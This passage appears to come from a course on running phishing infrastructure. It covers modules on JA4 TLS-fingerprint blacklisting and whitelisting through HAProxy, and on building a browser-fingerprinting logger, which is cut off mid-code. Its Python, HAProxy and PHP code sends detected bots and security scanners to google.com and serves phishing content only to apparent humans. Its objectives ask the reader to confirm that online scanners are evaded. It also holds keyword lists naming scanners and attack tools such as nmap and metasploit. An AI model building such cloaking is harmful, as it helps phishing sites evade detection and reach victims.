The `ja4db.json` database file contains many useful records for looking up fingerprints, but we can reduce the size of the database by removing duplicate records. For this task, we'll use ja4db-dedupe.py to de-duplicate the database. The Python script is included below for convenience.
```
#!/usr/bin/env python3

# Source: https://github.com/O-X-L/haproxy-ja4
# Copyright (C) 2024 Rath Pascal
# License: MIT

# script used to de-duplicate the fingerprint-applications listed inside the ja4db
# it's not perfect, but better than only pulling a random one

# download raw db:
#   curl -s https://ja4db.com/api/read/ -o ja4db.json

# pylint: disable=R0801

from collections import Counter
from re import sub as regex_replace
from json import loads as json_loads
from json import dumps as json_dumps

DEBUG = False
DEDUPE_FACTOR = 5

CLIENT_KEYS = ['user_agent_string', 'application', 'notes', 'os']

processed = {}
processed_clients = {}

def _get_client(_entry: dict):
    for k in CLIENT_KEYS:
        if _entry[k] is not None:
            return _entry[k].strip()

    return None

def _client_split(c):
    c = c.replace('(', '').replace(')', '')
    out = []

    for _c in c.split(' '):
        out.extend(_c.split('/'))

    return out

with open('ja4db.json', 'r', encoding='utf-8') as db_file:
    db_full = json_loads(db_file.read())
    for entry in db_full:
        fp = entry['ja4_fingerprint']
        if fp is None:
            continue

        fp = regex_replace(r'[^a-z0-9_]', '', fp)
        client = _get_client(entry)
        if client in [None, ''] or len(fp) != 36:
            continue

        client_items = _client_split(client)

        if fp not in processed:
            processed[fp] = [client_items]
            processed_clients[fp] = client_items

        else:
            processed[fp].append(client_items)
            processed_clients[fp].extend(client_items)

fp_to_dedupe = {}
fp_to_dedupe2 = {}
for fp, entries in processed_clients.items():
    entry_cnt = len(processed[fp])
    min_occ = entry_cnt - round((entry_cnt / DEDUPE_FACTOR))
    fp_to_dedupe[fp] = {
        k: v for k, v in Counter(entries).items()
        if v >= min_occ and k.strip() != ''
    }
    dedupe_client = ' '.join(list(fp_to_dedupe[fp].keys()))
    if dedupe_client == '' or regex_replace(r'[0-9\.\s]', '', dedupe_client) == '':
        continue

    fp_to_dedupe2[fp] = dedupe_client

if DEBUG:
    with open('ja4_dedupe_full.json', 'w', encoding='utf-8') as f:
        f.write(json_dumps(fp_to_dedupe, indent=4))

with open('ja4_dedupe.json', 'w', encoding='utf-8') as f:
    f.write(json_dumps(fp_to_dedupe2, indent=4))

```
Run the script using the command below to de-duplicate the database file and output a new file, `ja4_dedupe.json`.
```
python3 ja4-dedupe.py

```

### Extract Bot Fingerprints
After de-duplicating the database, we can use the ja4db-bots.py script to extract bot fingerprints. A minor adjustment was made to the script to reduce false positives by increasing the `BOT_SCORE_LIMIT` from `0` to `0.5`.
```
#!/usr/bin/env python3

# Source: https://github.com/O-X-L/haproxy-ja4
# Copyright (C) 2024 Rath Pascal
# License: MIT

# script used to create a list of only bot-related fingerprints
# WARNING: there can be false-positives - use the BOT_SCORE_LIMIT to modify the output-db

# download raw db:
#   curl -s https://ja4db.com/api/read/ -o ja4db.json

# pylint: disable=R0801

from re import sub as regex_replace
from json import loads as json_loads
from json import dumps as json_dumps

DEBUG = False
# making sure most of the recorded clients are bots - else we might have too many false-positives
# increase the limit for less false-positives; lower into negative to get more entries in the output-db
BOT_SCORE_LIMIT = 0.5

BOT_SCRIPT = [
    'golang', 'wget', 'curl', 'go-http-client', 'apache-httpclient', 'java', 'perl',
    'python', 'openssl', 'headless', 'cypress', 'mechanicalsoup', 'grpc-go', 'okhttp',
    'httpx', 'httpcore', 'aiohttp', 'httputil', 'urllib', 'guzzle', 'axios', 'ruby',
    'zend_http_client', 'wordpress', 'symfony', 'httpclient', 'cpp-httplib', 'ngrok',
    'malware', 'httprequest',
]
BOT_SCAN = [
    'scan', 'scanner', 'nessus', 'metasploit', 'zgrab', 'zmap', 'nmap', 'research', 'inspect',
]
BOT_CRAWL = [
    'bot', 'mastodon', 'https://', 'http://', 'whatsapp', 'twitter', 'facebook', 'chatgpt',
    'telegram', 'crawler', 'colly', 'phpcrawl', 'nutch', 'spider', 'scrapy', 'elinks',
    'imageVacuum', 'apify', 'chrome-lighthouse', 'adsdefender', 'baidu', 'yandex', 'duckduckgo',
    'google', 'yahoo', 'bing', 'microsoftpreview',
]
BOT_RANDOM = [
    'mozilla/4.', 'mozilla/3.', 'mozilla/2.', 'fidget-spinner-bot', 'test-bot', 'tiny-bot',
    'download', 'printer', 'router', 'camera', 'phillips hue', 'vpn', 'cisco', 'proxy', 'image',
    'office', 'fetcher', 'feed', 'photon', 'alittle client'
]
BOT_SEARCH = BOT_SCRIPT
BOT_SEARCH.extend(BOT_SCAN)
BOT_SEARCH.extend(BOT_CRAWL)
BOT_SEARCH.extend(BOT_RANDOM)

CLIENT_KEYS = ['user_agent_string', 'application', 'notes', 'os']

bot_fp = {}
bot_fp_score = {}

def _get_client(_entry: dict) :
    for k in CLIENT_KEYS:
        if _entry[k] is not None:
            return _entry[k].strip()

    return None

with open('ja4db.json', 'r', encoding='utf-8') as db_file:
    db = json_loads(db_file.read())

for entry in db:
    fp = entry['ja4_fingerprint']
    if fp is None:
        continue

    fp = regex_replace(r'[^a-z0-9_]', '', fp)
    client = _get_client(entry)
    if client in [None, ''] or len(fp) != 36:
        continue

    bot = False
    for s in BOT_SEARCH:
        if client.lower().find(s) != -1:
            bot = True
            bot_fp[fp] = client
            break

    if fp not in bot_fp_score:
        bot_fp_score[fp] = 0

    bot_fp_score[fp] += 1 if bot else -1

if DEBUG:
    with open('ja4_bots_full.json', 'w', encoding='utf-8') as f:
        f.write(json_dumps(bot_fp_score, indent=4))

for fp, score in bot_fp_score.items():
    if score < BOT_SCORE_LIMIT:
        try:
            bot_fp.pop(fp)

        except KeyError:
            pass

with open('ja4_bots.json', 'w', encoding='utf-8') as f:
    f.write(json_dumps(bot_fp, indent=4))

```
Run the script using the command below to produce the file `ja4_bots.json`.
```
python ja4db-bots.py

```

### Create Map File
The `ja4_bots.json` file contains records that map JA4 fingerprints to user-agent strings. Below is an excerpt from the file:
```
{
    "t13d301200_1d37bd780c83_d339722ba4af": "http.rb/5.1.1 (Mastodon/4.2.10; +https://restive.social/) Bot",
    "t13d880900_fcb5b95cb75a_b0d3b4ac2a14": "SoftEther VPN",
    "t12d330900_6170e2a7c060_686390af6b8e": "LinkedInBot/1.0 (compatible; Mozilla/5.0; Apache-HttpClient +http://www.linkedin.com)",
    "t13d301200_1d37bd780c83_550dd089df7a": "http.rb/5.1.0 (Mastodon/3.5.19+iceage; +https://bsd.network/) Bot",
    "t13d360600_b3158157a1d4_188bc74aacc5": "Pleroma 2.6.3; https://social.whydoesntmycode.work <example@example.com>; Bot",
    "t12d300600_28df28bfa019_a1e935682795": "http.rb/5.1.1 (Mastodon/4.1.16; +https://mstdn.mx/) Bot",
    "t12d120700_3bab475705cb_0f3b2bcde21d": "Twitterbot/1.0",
    ...

}

```
This file can be utilized by a PHP script for JA4 fingerprint lookups; however, in this module, we will demonstrate an alternative approach where HAProxy performs the lookup and passes the result to our phishing server through an HTTP header. Doing so requires the file to be converted to a key-value map format which can be done using the ja4db-to-map.py script.The script has been updated to generate the map file using the `ja4_bots.json` file instead of the `ja4_dedupe.json` file.
```
# Source: https://github.com/O-X-L/haproxy-ja4
# Copyright (C) 2024 Rath Pascal
# License: MIT

# download raw db:
#   curl -s https://ja4db.com/api/read/ -o ja4db.json
# generate a deduplicated db:
#   python3 ja4db-dedupe.py

from pathlib import Path
from os import system as shell
from json import loads as json_loads

DEBUG = False
# see: https://www.haproxy.com/blog/introduction-to-haproxy-maps
#   'Empty lines and extra whitespace between words are ignored'
WHITESPACE_REPLACE = '_'

with open('ja4_bots.json', 'r', encoding='utf-8') as db_file:
    db = json_loads(db_file.read())

with open('ja4_bots.map', 'w', encoding='utf-8') as map_file:
    map_file.write('\n'.join([
        f"{fp} {client.replace(' ', WHITESPACE_REPLACE)}"
        for fp, client in db.items()
    ]))

```
Run the script using the command below to produce the `ja4_bots.map` file.
```
python3 ja4db-to-map.py

```
The resulting file will have a key-value format as shown in the excerpt below.
```
t13d1711ht_5b57614c22b0_5894756fee65 curl/8.5.1-DEV
t13d120900_0ed44715e6cd_95ca0cbbc74b facebookexternalhit/1.1;line-poker/1.0
t13d521000_b262b3658495_518fb456ca59 Iceshrimp/2023.12.9-dev-3adb155ed_(https://infosec.town)
t12i2405ht_a57d86c8052b_22a92d800fe4 python-requests/2.27.1
t13d1514h2_8daaf6152771_fddc3888abdf CCBot/2.0_(https://commoncrawl.org/faq/)
t13i741000_a97353c36de0_d41ae481755e Mozilla/5.0_(compatible;_Nmap_Scripting_Engine;_https://nmap.org/book/nse.html)
t13i4210ht_49900ac2774e_a29327ec888c python-requests/2.26.0
...
...

```

## Update HAProxy Configuration
To use the newly generated map file, we need to update the `frontend` section of our HAProxy configuration. The updated HAProxy configuration performs a lookup of the JA4 fingerprint in a map file and passes the result to the backend application via an HTTP header. If the fingerprint is found in the map file, the corresponding value is set in the `X-Bot-Id` header. If no match is found, the header defaults to `false`.
```
frontend phishingProxy
    bind *:443 ssl crt /etc/haproxy/realhealthysnacks.com.pem
    http-request lua.fingerprint_ja4
    http-request set-header X-JA4-Fingerprint %[var(txn.fingerprint_ja4)]

    # Determine if the fingerprint is found in the map file.
    # Default to false if not found
    # Return the results in the X-Bot-Id HTTP header
    http-request set-var(txn.fingerprint_app) var(txn.fingerprint_ja4),map(/etc/haproxy/ja4db/ja4_bots.map,false)
    http-request set-header X-Bot-Id %[var(txn.fingerprint_app)]

    default_backend servers

```

## Update PHP Script
The PHP script is also updated to print the `X-Bot-Id` HTTP header along with the JA4 fingerprint.
```
<?php
if (isset($_SERVER['HTTP_X_JA4_FINGERPRINT'])) {
    $ja4Fingerprint = $_SERVER['HTTP_X_JA4_FINGERPRINT'];
    echo "JA4 Fingerprint:" . htmlspecialchars($ja4Fingerprint) . "<br><br>";
} else {
    echo "No JA4 Fingerprint found in the headers.<br>";
}

if (isset($_SERVER['HTTP_X_BOT_ID'])) {
    $botFlag = $_SERVER['HTTP_X_BOT_ID'];
    echo "X-Bot-ID: " . $botFlag . "<br>";
}

// Redirect the client away if the value is not false
// if ($botFlag !== "false") {
//    header("Location: https://www.google.com");
//    exit;
//}
?>

```

## Demo

Accessing the website using the Firefox browser produces a `false` value for `X-Bot-Id`.

- Accessing the website using a Python script that has a JA4 fingerprint in the `ja4_bots.map`. The `X-Bot-Id` is the JA4 fingerprint's corresponding user-agent.

- The image below demonstrates accessing the website using the Python script after enabling the redirection code in the PHP script. As shown, the automated script is redirected to `google.com` because the JA4 fingerprint matches an entry in the `ja4_bots.map` file.

## Conclusion
In this module, we explored how to set up and use the JA4 database for blacklisting known bot fingerprints. The effectiveness of this blacklisting method depends on the quality and size of the database, making it worthwhile to consider expanding the database with additional JA4 fingerprints.

## Objectives
Create the ja4_bots.map file

Check if the incoming JA4 fingerprint is found in the ja4_bots.map file

If the JA4 fingerprint is found in the ja4_bots.map file, show the client a benign HTML page


---

# Module 71 - JA4 Analysis Blacklisting Partial JA4 Fingerprints

Módulo 71 — JA4 Analysis Blacklisting Partial JA4 Fingerprints

- # Module 71 - JA4 Analysis Blacklisting Partial JA4 Fingerprints

# Disclaimer
# Módulo 71 — JA4: Blacklisting de Fingerprints Parciais

## Introduction
In the previous module, we explored how to blacklist entire JA4 fingerprints by comparing a client's fingerprint against our database. The primary limitation of this approach is that its effectiveness depends on the database's size and comprehensiveness. A smaller or less detailed database increases the likelihood of bots bypassing the blacklist and accessing the website.To address this, we can adopt an alternative blacklisting method by focusing on specific sections of the fingerprint for detection. Recall that the JA4 fingerprint follows the format a_b_c, as illustrated in the diagram below from FoxIO.Recall that the JA4 fingerprint is typically based on the underlying TLS library. For example, if a program is written in Python, its fingerprint is likely to match or share similarities with other Python programs. This concept is evident in the image below, where the JA4_b section of the fingerprint matches both Google Chrome and a Chromedriver application, as they both rely on Chromium as the underlying framework.In this module we will use parts of the JA4 fingerprints to blacklist clients at a higher rate, while maintaining a relatively low false positive score.
## Database Format
Our PHP script will check a database file, `blacklist_ja4.txt`, for the blacklisted JA4_a, JA4_b and JA4_c fingerprints. The database format will be as follows:
```
{
  "ja4_a": [],
  "ja4_b": [],
  "ja4_c": []
}

```
Where the array will have an array of blacklisted fingerprints as shown in the example below.
```
{
  "ja4_a": [
  "fingerprint_1", 
  "fingerprint_2", 
  "fingerprint_3"
  ],
  "ja4_b": [
  "fingerprint_4",
  "fingerprint_5", 
  "fingerprint_6"
  ],
  "ja4_c": [
    "fingerprint_7",
    "fingerprint_8", 
    "fingerprint_9"
  ]
}

```
Ensure the `blacklist_ja4.txt` database file is saved in `/var/www` and ownership is changed to `www-data`.
```
cd /var/www

chown www-data:www-data blacklist_ja4.txt

```

## Update PHP Script
The PHP script outlined below performs several key actions:
It defines the `blockBot` function, which redirects the client to `google.com`. This function can be modified for different blocking strategies, such as displaying a 404 error or benign content.

- It checks the `X-Bot-Id` header for any value other than `false`. If such a value is found, it executes the `blockBot()` function to redirect the client.

- It reads the `HTTP_X_JA4_FINGERPRINT` header and splits it to extract the segments corresponding to `ja4_a`, `ja4_b`, and `ja4_c`.

- It loads a blacklist from the `blacklist_ja4.txt` file and compares each part of the fingerprint (`ja4_a`, `ja4_b`, `ja4_c`) against its respective blacklist. If a match is found in any list, the `blockBot()` function is activated to redirect the client away from our phishing website.

- If there's no match, it will display the phishing content.

```
<?php

function blockBot() {
    header("Location: https://www.google.com");
    exit;
}

// Check if a part of JA4 fingerprint is in the blacklist and block the bot if it is
function checkJA4Part($ja4Part, $blacklist) {
    if (in_array($ja4Part, $blacklist)) {
        blockBot();
    }
}

// Blocking based off entire JA4 fingerprint
if (isset($_SERVER['HTTP_X_BOT_ID'])) {
    $botFlag = $_SERVER['HTTP_X_BOT_ID'];
    if ($botFlag === "true") {
        blockBot();
    }
}

// Load the blacklist file
$blacklistFile = '/var/www/blacklist_ja4.txt';
$blacklist = json_decode(file_get_contents($blacklistFile), true);

if (isset($_SERVER['HTTP_X_JA4_FINGERPRINT'])) {
    $ja4Fingerprint = $_SERVER['HTTP_X_JA4_FINGERPRINT'];
    $parts = explode('_', $ja4Fingerprint);

    // Check ja4_a, ja4_b, ja4_c with the corresponding blacklisted array
    checkJA4Part($parts[0], $blacklist['ja4_a']);  // Check ja4_a
    checkJA4Part($parts[1], $blacklist['ja4_b']);  // Check ja4_b
    checkJA4Part($parts[2], $blacklist['ja4_c']);  // Check ja4_c
}

// Legitimate clients
// Showing phishing stuff
// echo $ja4Fingerprint; // debugging
echo "You are not a bot.";
?>

```

## Demo
In the demonstration below, we add the browser's JA4_a fingerprint to the blacklist, causing the redirection to `google.com`

The video can be found in folder: `./videos/demo-partial-ja4-analysis.mov`

## Optional: Convert ja4_bots.map To blacklist_ja4.txt
Recall in the JA4 Analysis: Blacklisting JA4 Fingerprints module we created the `ja4_bots.map` file which was a list of JA4 fingerprints. A possible optional approach is to convert the `ja4_bots.map` file into our new `blacklist_ja4.txt` file. The command below uses `awk` and `jq` to convert `ja4_bots.map` to the expected blacklist file format.

```
awk -F'_' '{print $1, $2, $3}' ja4_bots.map | jq -R -s -c '{
  ja4_a: (split("\n") | map(select(. != "") | split(" ") | .[0])),
  ja4_b: (split("\n") | map(select(. != "") | split(" ") | .[1])),
  ja4_c: (split("\n") | map(select(. != "") | split(" ") | .[2]))
}' > blacklist_ja4.txt

```
The previous command extracts the entirety of the JA4 fingerprint (i.e. ja4a_ja4b_ja4c) from the `ja4_bots.map` using `awk` and formats them into a JSON object with `jq`. The extracted values are grouped into `ja4_a`, `ja4_b`, and `ja4_c` arrays and saved to `blacklist_ja4.txt`.

If the file is currently located on the HAProxy server we can transfer it to the phishing server using the `scp` command. Replace `phishing-server-ip` with the actual IP address of the phishing server, and specify `/var/www` as the destination directory.

```
scp /etc/haproxy/ja4db/blacklist_ja4.txt root@phishing-server-ip:/var/www

```
On the phishing server, modify the owner of the `blacklist_ja4.txt` to be `www-data`.

```
cd /var/www

chown www-data:www-data blacklist_ja4.txt

```

## Conclusion
This module introduces an improved approach compared to the previous one. Instead of blacklisting entire JA4 fingerprints, this method targets individual components of the fingerprint, allowing for more precise and flexible client blocking. By analyzing and filtering specific parts of the JA4 fingerprint, we can implement more granular and effective blacklist rules.

## Objectives
Search known JA4 bot fingerprints and find patterns that can be used for blacklisting purposes

Based off your research, blacklist the most common bot JA4a, JA4b, and JA4c fingerprints

Scan your website using online scanners, is the JA4 partial blacklisting approach successful?


---

# Module 72 - JA4 Analysis Whitelisting Partial JA4 Fingerprints

Módulo 72 — JA4 Analysis Whitelisting Partial JA4 Fingerprints

- # Module 72 - JA4 Analysis Whitelisting Partial JA4 Fingerprints

# Disclaimer
# Módulo 72 — JA4: Whitelisting de Fingerprints Parciais

## Introduction
In the previous module we blacklisted a client based off their JA4_a, JA4_b or JA4_c fingerprints. In this module, we will use the same setup to whitelist clients based off their partial JA4 fingerprint and block all other clients. This method is more prone to false positives just as other whitelisting approaches we've shown throughout this course (e.g. IP address whitelisting, user-agent whitelisting).
## Update HAProxy Configuration
Adjust the `frontend` section of the HAProxy configuration to only send the `X-JA4-Fingerprint` header, removing any fingerprint mapping that was previously demonstrated in the JA4 blacklisting modules.
```
frontend phishingProxy
    bind *:443 ssl crt /etc/haproxy/realhealthysnacks.com.pem
    http-request lua.fingerprint_ja4
    http-request set-header X-JA4-Fingerprint %[var(txn.fingerprint_ja4)]

##### Comment out #####
#    http-request set-var(txn.fingerprint_app) var(txn.fingerprint_ja4),map(/etc/haproxy/ja4db/ja4_bots.map,false)
#    http-request set-header X-Bot-Id %[var(txn.fingerprint_app)]

    default_backend servers

```
Restart `haproxy` using the command below:
```
sudo systemctl restart haproxy

```

## Database Format
Our PHP script will check a database file, `whitelist_ja4.txt`, for the whitelisted JA4_a, JA4_b and JA4_c fingerprints. The database format will be as follows:
```
{
  "ja4_a": [],
  "ja4_b": [],
  "ja4_c": []
}

```
Where the array will have an array of whitelisted fingerprints as shown in the example below.
```
{
  "ja4_a": [
  "fingerprint_1", 
  "fingerprint_2", 
  "fingerprint_3"
  ],
  "ja4_b": [
  "fingerprint_4",
  "fingerprint_5", 
  "fingerprint_6"
  ],
  "ja4_c": [
    "fingerprint_7",
    "fingerprint_8", 
    "fingerprint_9"
  ]
}

```
Ensure the `whitelist_ja4.txt` database file is saved in `/var/www` and ownership is changed to `www-data`.
```
cd /var/www

chown www-data:www-data whitelist_ja4.txt

```

## Update PHP Script
The PHP script outlined below performs several key actions:
It defines the `blockBot` function, which redirects the client to `google.com`.

- It reads the `HTTP_X_JA4_FINGERPRINT` header and splits it to extract the segments corresponding to `ja4_a`, `ja4_b`, and `ja4_c`.

- It loads a whitelist from the `whitelist_ja4.txt` file and compares each part of the fingerprint against its respective whitelist. If any part is found in the whitelist, it notes which parts are validated.

- If at least one part of the fingerprint is in the whitelist, it displays the phishing content.

- Otherwise, the user is redirected to `google.com` via `blockBot()`.

```
<?php

function blockBot() {
    header("Location: https://www.google.com");
    exit;
}

function isWhitelisted($ja4Part, $whitelist) {
    return in_array($ja4Part, $whitelist);
}

$whitelistFile = '/var/www/whitelist_ja4.txt';
$whitelistContents = file_get_contents($whitelistFile);
$whitelist = json_decode($whitelistContents, true);

if (isset($_SERVER['HTTP_X_JA4_FINGERPRINT'])) {
    $ja4Fingerprint = $_SERVER['HTTP_X_JA4_FINGERPRINT'];
    $parts = explode('_', $ja4Fingerprint);

    // Check JA4_a, JA4_b, and JA4_c
    $isWhitelistedA = isWhitelisted($parts[0], $whitelist['ja4_a']);
    $isWhitelistedB = isWhitelisted($parts[1], $whitelist['ja4_b']);
    $isWhitelistedC = isWhitelisted($parts[2], $whitelist['ja4_c']);

    if (!$isWhitelistedA && !$isWhitelistedB && !$isWhitelistedC) {
        blockBot();
    } else {
        if ($isWhitelistedA) {
            echo "JA4_a found.\n";
        }
        if ($isWhitelistedB) {
            echo "JA4_b found.\n";
        }
        if ($isWhitelistedC) {
            echo "JA4_c found.\n";
        }
        echo "\nYou are not a bot.";
    }
}
?>

```

## Demo
In the demonstration below, we remove the browser's JA4_a fingerprint from the whitelist, causing the redirection to `google.com`

The video can be found in folder: `./videos/demo-whitelist-ja4.mov`

## Objectives
Search known JA4 fingerprints and find patterns that can be used for whitelisting purposes

Based off your research, whitelist the most common legitimate JA4a, JA4b, and JA4c fingerprints

Scan your website using online scanners, is the JA4 partial whitelisting approach successful?

Access your website from different devices and browsers to verify that you're not being blocked


---

# Módulo 73 — Construindo Biblioteca de Logging de Clientes

Módulo 73 — Building a Client Logging Library

- # Módulo 73 — Construindo Biblioteca de Logging de Clientes

# Disclaimer

## Introduction
In this module, we will develop a logging system for clients which logs server-side and client-side information. This logger will capture and record client information that may assist in determining whether the client is a legitimate human or a bot.
## Building Client-Side Logger
To start, we create a JavaScript object named `ClientLogger` within an immediately invoked function expression (IIFE) to encapsulate related functions. An IIFE is a function that executes immediately after being defined. We then create the `logClientInfo` function which will contain all the logging functionality.
```
(function(global) {
    const ClientLogger = {
        logClientInfo: async function() {
            // Log client info here
        }
    };

    global.ClientLogger = ClientLogger; // Expose ClientLogger to the global object
})(window);

```

### Logging Navigator Interface Properties
The `navigator` interface contains useful properties that can help in distinguishing legitimate clients from bots. The JavaScript code below checks if the `navigator` interface is available and retrieves various properties about the user's browser and environment, such as the user agent, application name, version, platform, and other details, storing them in the `navigatorProperties` object. You can review the Navigator Interface Documentation to discover the available properties and the valuable information they offer.
```
...
...
if (navigator) {
    const navigatorProperties = {
        userAgent: navigator.userAgent,
        appName: navigator.appName,
        appVersion: navigator.appVersion,
        oscpu: navigator.oscpu || 'Not Supported',
        platform: navigator.platform,
        language: navigator.language,
        languages: navigator.languages,
        cookieEnabled: navigator.cookieEnabled,
        connection: navigator.connection ? navigator.connection.rtt : -1,
        standalone: navigator.standalone || false,
        userAgentData: navigator.userAgentData ? {
            platform: navigator.userAgentData.platform || 'Unknown',
            brands: navigator.userAgentData.brands || [],
            mobile: navigator.userAgentData.mobile || false
        } : 'Not supported',
        onLine: navigator.onLine,
        vendor: navigator.vendor,
        product: navigator.product,
        hardwareConcurrency: navigator.hardwareConcurrency,
        maxTouchPoints: navigator.maxTouchPoints,
        geolocation: !!navigator.geolocation,
        clipboardRead: !!navigator.clipboard,
        serviceWorker: !!navigator.serviceWorker,
        mediaDevices: !!navigator.mediaDevices,
        buildID: navigator.buildID || 'Unknown',
        productSub: navigator.productSub || 'Unknown',
        vendorSub: navigator.vendorSub || 'Unknown',
        pdfViewerEnabled: navigator.pdfViewerEnabled || false,
        deviceMemory: navigator.deviceMemory || 'Unknown',
        doNotTrack: navigator.doNotTrack,
        webdriver: navigator.webdriver || false,
        bluetooth: !!navigator.bluetooth,
        credentials: !!navigator.credentials,
        hid: !!navigator.hid,
        keyboard: !!navigator.keyboard,
        locks: !!navigator.locks,
        mediaCapabilities: !!navigator.mediaCapabilities,
        mediaSession: !!navigator.mediaSession,
        permissions: !!navigator.permissions,
        presentation: !!navigator.presentation,
        scheduling: !!navigator.scheduling,
        serial: !!navigator.serial,
        storage: !!navigator.storage,
        usb: !!navigator.usb,
        userActivation: !!navigator.userActivation,
        wakeLock: !!navigator.wakeLock,
        xr: !!navigator.xr,
        plugins: Array.from(navigator.plugins).map(plugin => ({
            name: plugin.name,
            description: plugin.description,
            filename: plugin.filename
        }))
    };
    let navCount = 0;
    for (let prop in navigator) {
        navCount++;
    }
    clientInfo.navigator = {
        ...navigatorProperties,
        propertyCount: navCount
    };
}
...
...

```

### Navigator Permissions Property
Within the `navigator` interface exists the `permissions` property which provides a way to check the status of various browser permissions. The JavaScript code queries a list of permissions and stores their states (e.g., `granted`, `denied`, or `prompt`) in the `clientInfo.permissions` object. A legitimate client will often have a combination of `prompt` and unsupported permissions.
```
...
...
if (navigator.permissions) {
    clientInfo.permissions = {};
    const permissionsList = [
        'geolocation',
        'notifications',
        'push',
        'camera',
        'microphone',
        'midi',
        'clipboard-read',
        'clipboard-write',
        'accelerometer',
        'ambient-light-sensor',
        'background-sync',
        'magnetometer',
        'persistent-storage',
        'payment-handler'
    ];
    await Promise.all(
        permissionsList.map(async (permissionName) => {
            try {
                const result = await navigator.permissions.query({ name: permissionName });
                clientInfo.permissions[permissionName] = result.state;
            } catch {
                clientInfo.permissions[permissionName] = 'Not supported';
            }
        })
    );
}
...
...

```

### Logging Window Interface Properties
The `window` interface also provides information that could indicate abnormalities in the client. The JavaScript code below collects various properties from the `window` interface, such as screen dimensions, device pixel ratio, scroll position, and available features. You can review the Window Interface Documentation to discover the available properties and the valuable information they offer.
```
...
...
clientInfo.window = {
    innerWidth: window.innerWidth,
    innerHeight: window.innerHeight,
    outerWidth: window.outerWidth,
    outerHeight: window.outerHeight,
    devicePixelRatio: window.devicePixelRatio || 1,
    pageXOffset: window.pageXOffset || 0,
    pageYOffset: window.pageYOffset || 0,
    screenX: window.screenX || 0,
    screenY: window.screenY || 0,
    scrollX: window.scrollX || 0,
    scrollY: window.scrollY || 0,
    historyLength: window.history.length,  // Length of the browsing history stack
    performance: {
        timeOrigin: window.performance.timeOrigin,
        navigationStart: window.performance.timing.navigationStart,
    },
    features: {
        serviceWorker: 'serviceWorker' in navigator,
        localStorage: 'localStorage' in window,
        sessionStorage: 'sessionStorage' in window,
        indexedDB: 'indexedDB' in window,
        matchMedia: typeof window.matchMedia !== 'undefined',
        touchSupport: 'ontouchstart' in window
    },
    visualViewport: window.visualViewport ? {
        width: window.visualViewport.width,
        height: window.visualViewport.height,
        offsetLeft: window.visualViewport.offsetLeft,
        offsetTop: window.visualViewport.offsetTop,
        scale: window.visualViewport.scale
    } : null
};
...
...

```

### Logging Screen Properties
The `screen` interface provides information about the physical screen of the device. The JavaScript code below collects several properties from the `screen` interface, such as screen width, screen height and screen orientation. You can review the Screen Interface Documentation to discover the available properties and the valuable information they offer.
```
...
...
if (screen) {
    clientInfo.screen = {
        width: screen.width,
        height: screen.height,
        availWidth: screen.availWidth,
        availHeight: screen.availHeight,
        colorDepth: screen.colorDepth,
        pixelDepth: screen.pixelDepth,
        orientation: screen.orientation ? screen.orientation.type : 'unknown',
        availTop: screen.availTop || 0,
        availLeft: screen.availLeft || 0
    };
}
...
...

```

### Logging Canvas Information
The JavaScript code below attempts to create a WebGL context using a canvas element to gather information about the device's GPU. If successful, it stores details like the GPU vendor, renderer, and supported extensions in the `clientInfo.webGL` object. This information can be used to detect bots by identifying unusual or generic GPU details, such as inconsistent or generic vendor and renderer values, which are often associated with emulated or headless environments.
```
...
...
try {
    const canvas = document.createElement('canvas');
    const gl = canvas.getContext('webgl') || canvas.getContext('experimental-webgl');
    if (gl) {
        clientInfo.webGL = {
            vendor: gl.getParameter(gl.VENDOR),
            renderer: gl.getParameter(gl.RENDERER),
            extensions: gl.getSupportedExtensions()
        };
    }
} catch (e) {
    clientInfo.webGL = { error: e.message };
}
...
...

```

### Logging Storage Information
Modern browsers provide various storage mechanisms, and logging their availability can offer insights into whether the client is a genuine human user or an automated bot. Legitimate browsers typically support features like `localStorage`, `sessionStorage`, and `indexedDB`, whereas bots or automated environments may lack support or have these mechanisms disabled.
```
...
...
clientInfo.storage = {
    localStorage: typeof localStorage !== 'undefined',
    sessionStorage: typeof sessionStorage !== 'undefined',
    indexedDB: !!window.indexedDB
};
...
...

```

### Logging Media Support & Devices
The JavaScript code below checks the audio and video format support which Bots may lack accurate implementations of media playback or device enumeration, making these checks potentially useful for bot detection.
```
...
...
clientInfo.media = {
    audioFormats: {
        aac: new Audio().canPlayType('audio/aac'),
        flac: new Audio().canPlayType('audio/flac'),
        mpeg: new Audio().canPlayType('audio/mpeg'),
        oggFlac: new Audio().canPlayType('audio/ogg; codecs="flac"'),
        oggVorbis: new Audio().canPlayType('audio/ogg; codecs="vorbis"'),
        oggOpus: new Audio().canPlayType('audio/ogg; codecs="opus"'),
        wav: new Audio().canPlayType('audio/wav; codecs="1"'),
        webmVorbis: new Audio().canPlayType('audio/webm; codecs="vorbis"'),
        webmOpus: new Audio().canPlayType('audio/webm; codecs="opus"'),
        mp4a: new Audio().canPlayType('audio/mp4; codecs="mp4a.40.2"')
    },
    videoFormats: {
        mp4Flac: document.createElement('video').canPlayType('video/mp4; codecs="flac"'),
        webmVp9Opus: document.createElement('video').canPlayType('video/webm; codecs="vp9, opus"'),
        webmVp8Vorbis: document.createElement('video').canPlayType('video/webm; codecs="vp8, vorbis"')
    }
};

clientInfo.mediaDevices = [];
await navigator.mediaDevices.enumerateDevices().then(devices => {
    devices.forEach(device => {
        clientInfo.mediaDevices.push({ kind: device.kind });
    });
});
...
...

```

### Adblocker Detection
Checking if the client is using an ad blocker can help identify legitimate users, as many users install ad blockers on their browsers. The `checkAdBlocker` function below makes an HTTP `HEAD` request to a known ad URL which should trigger any adblocker. If the request fails or the response URL is altered, it suggests that an ad blocker is active.
```
...
...
// https://dirask.com/posts/JavaScript-detect-if-adblock-is-enabled-tested-in-2024-1yR6lD
checkAdBlocker: function() {
    const ADS_URL = 'https://pagead2.googlesyndication.com/pagead/js/adsbygoogle.js';
    return new Promise(resolve => {
        const xhr = new XMLHttpRequest();
        xhr.onreadystatechange = function() {
            if (xhr.readyState === XMLHttpRequest.DONE) {
                resolve(xhr.status === 0 || xhr.responseURL !== ADS_URL);
            }
        };
        xhr.open('HEAD', ADS_URL, true);
        xhr.send(null);
    });
}

clientInfo.adsBlocked = await this.checkAdBlocker();
...
...

```

### Detect Bot Variables
Bot or headless browsers may have certain variables defined that would not exist otherwise in a legitimate browser. The `detectBotVariables` function below checks if bot variables are defined in the browser.
```
...
...
// https://github.com/0x48piraj/BF-F/blob/master/lib/decog.js#L228
detectBotVariables: function() {
    const windowBotVars = ['webdriver', '_Selenium_IDE_Recorder', 'callSelenium', '_selenium', 'callPhantom', '_phantom', 'phantom', '__nightmare'],
